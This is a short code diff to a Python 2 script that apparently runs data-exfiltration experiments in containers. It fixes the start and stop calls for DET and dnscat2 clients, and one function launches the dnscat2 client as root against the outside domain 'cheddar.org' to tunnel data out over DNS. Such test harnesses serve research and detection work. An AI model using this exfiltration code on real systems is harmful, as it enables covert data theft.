@@ -348,7 +348,7 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
                     if exfil_method == 'DET':
                         thread.start_new_thread(start_det_client, (file_to_exfil, exfil_protocol, container))
                     elif exfil_method == 'dnscat':
-                        thread.start_new_thread(start_dnscat_client(), (container))
+                        thread.start_new_thread(start_dnscat_client, (container))
                     else:
                         print "that exfiltration method was not recognized!"
 
@@ -361,7 +361,7 @@ def main(experiment_name, config_file, prepare_app_p, port, ip, localhostip, ins
                     if exfil_method == 'DET':
                         stop_det_client(container)
                     elif exfil_method == 'dnscat':
-                        start_dnscat_client()
+                        stop_dnscat_client(container)
                     else:
                         print "that exfiltration method was not recognized!"
 
@@ -1084,7 +1084,7 @@ def setup_config_file_det_client(dst, container, directory_to_exfil, regex_to_ex
     #print next( file_to_exfil.output )
     return file_to_exfil
 
-def start_dnscat_client():
+def start_dnscat_client(container):
     cmds = ['/dnscat2/client/dnscat', 'cheddar.org']
     print "start dns exfil commands", str(cmds)
     out = container.exec_run(cmds, user="root", workdir='/dnscat2/client/', stdout=True)
